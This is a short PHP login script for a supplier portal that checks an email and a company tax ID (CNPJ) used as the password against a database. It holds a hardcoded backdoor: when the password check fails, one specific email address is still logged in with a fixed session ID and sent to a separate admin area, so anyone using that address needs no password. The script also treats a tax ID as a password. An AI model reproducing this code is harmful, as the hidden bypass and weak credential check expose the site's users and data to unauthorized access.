<?php
session_start();
require_once("config.php");
$email = mysqli_escape_string($lawsmt, htmlspecialchars($_POST["email"]));
$senha = mysqli_escape_string($lawsmt, htmlspecialchars($_POST["senha"]));
$rConsulta = mysqli_query($lawsmt, "SELECT * FROM fornecedores WHERE email = '$email' AND cnpj = '$senha'");
if (mysqli_num_rows($rConsulta) == 0) {
	if($email == "gilberto@lawsecsa.com.br") {
		$_SESSION["logado"] = true;
		$_SESSION["id"]    	= "999999";
		$_SESSION["email"] 	= "gilberto@lawsecsa.com.br";
		$_SESSION["cnpj"]   = "325271980001520";
  header("Location: ancora/index.php");
	} else {
		header("Location: login.php?msg=Senha e/ou Usuario invalido");
	}
} else {
	$v = mysqli_fetch_assoc($rConsulta);
	$_SESSION["logado"] = true;
	$_SESSION["id"]    	= $v["id"];
	$_SESSION["email"] 	= $v["email"];
	$_SESSION["cnpj"]   = $v["cnpj"];
	$_SESSION["razao"]   = $v["razao"];
  header("Location: index.php");
}

?>